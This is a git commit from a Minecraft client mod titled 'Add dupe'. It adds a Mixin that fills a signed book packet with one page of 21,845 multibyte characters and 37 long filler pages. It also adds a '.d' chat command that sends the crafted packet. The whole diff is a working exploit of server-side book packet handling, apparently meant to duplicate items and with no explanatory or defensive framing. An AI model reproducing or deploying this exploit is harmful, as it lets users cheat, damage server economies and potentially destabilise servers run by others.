0b33bf65e0bc1de0067b9d1dd6a37ad992219ca1
TangyKiwi <orange.panda.65@gmail.com>
2020-12-24 17:47:59 -0800

    Add dupe

---
+++ src/main/java/com/tangykiwi/kiwiclient/mixin/BookUpdateC2SPacketMixin.java
@@ -0,0 +1,41 @@
+package com.tangykiwi.kiwiclient.mixin;
+
+import net.minecraft.item.ItemStack;
+import net.minecraft.nbt.ListTag;
+import net.minecraft.nbt.StringTag;
+import net.minecraft.nbt.Tag;
+import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
+import org.spongepowered.asm.mixin.Mixin;
+import org.spongepowered.asm.mixin.Shadow;
+import org.spongepowered.asm.mixin.injection.At;
+import org.spongepowered.asm.mixin.injection.Inject;
+import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
+
+@Mixin(BookUpdateC2SPacket.class)
+public class BookUpdateC2SPacketMixin {
+    private static final String str1;
+    private static final String str2 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+    @Shadow
+    private ItemStack itemStack;
+
+    @Inject(at={@At(value="RETURN")}, method={"<init>(Lnet/minecraft/item/ItemStack;ZI)V"})
+    public void onInit(ItemStack book, boolean signed, int slot, CallbackInfo callbackInfo) {
+        System.out.println("CALLED");
+        if (signed && book.getTag().getList("pages", 8).getString(0).equals((Object)"DUPE")) {
+            ListTag listTag = new ListTag();
+            listTag.addTag(0, (Tag) StringTag.of((String)str1));
+            for (int i = 1; i < 38; ++i) {
+                listTag.addTag(i, (Tag)StringTag.of((String)str2));
+            }
+            this.itemStack.putSubTag("pages", (Tag)listTag);
+        }
+    }
+
+    static {
+        StringBuilder stringBuilder = new StringBuilder();
+        for (int i = 0; i < 21845; ++i) {
+            stringBuilder.append('\u0800');
+        }
+        str1 = stringBuilder.toString();
+    }
+}
--- src/main/java/com/tangykiwi/kiwiclient/mixin/ClientPlayerEntityMixin.java
+++ src/main/java/com/tangykiwi/kiwiclient/mixin/ClientPlayerEntityMixin.java
@@ -7,6 +7,14 @@ import net.minecraft.client.MinecraftClient;
 import net.minecraft.client.network.AbstractClientPlayerEntity;
 import net.minecraft.client.network.ClientPlayerEntity;
 import net.minecraft.client.world.ClientWorld;
+import net.minecraft.item.Items;
+import net.minecraft.item.WritableBookItem;
+import net.minecraft.item.ItemStack;
+import net.minecraft.nbt.ListTag;
+import net.minecraft.nbt.StringTag;
+import net.minecraft.nbt.Tag;
+import net.minecraft.network.Packet;
+import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
 import org.spongepowered.asm.mixin.Mixin;
 import org.spongepowered.asm.mixin.Shadow;
 import org.spongepowered.asm.mixin.injection.At;
@@ -33,5 +41,18 @@ public class ClientPlayerEntityMixin extends AbstractClientPlayerEntity {
         KiwiClient.eventBus.post(event);
         if (event.isCancelled())
             info.cancel();
+    }
+
+    @Inject(method = "sendChatMessage", at = @At("HEAD"), cancellable = true)
+    public void onChatMessage(String message, CallbackInfo callbackInfo) {
+        if(message.equals(".d")) {
+            ItemStack itemStack = new ItemStack(Items.WRITABLE_BOOK, 1);
+            ListTag pages = new ListTag();
+            pages.add(0, (Tag) StringTag.of((String)"DUPE"));
+            itemStack.putSubTag("pages", (Tag) pages);
+            itemStack.putSubTag("title", (Tag)StringTag.of((String)"a"));
+            client.getNetworkHandler().sendPacket((Packet)new BookUpdateC2SPacket(itemStack, true, inventory.selectedSlot));
+            callbackInfo.cancel();
+        }
     }
 }
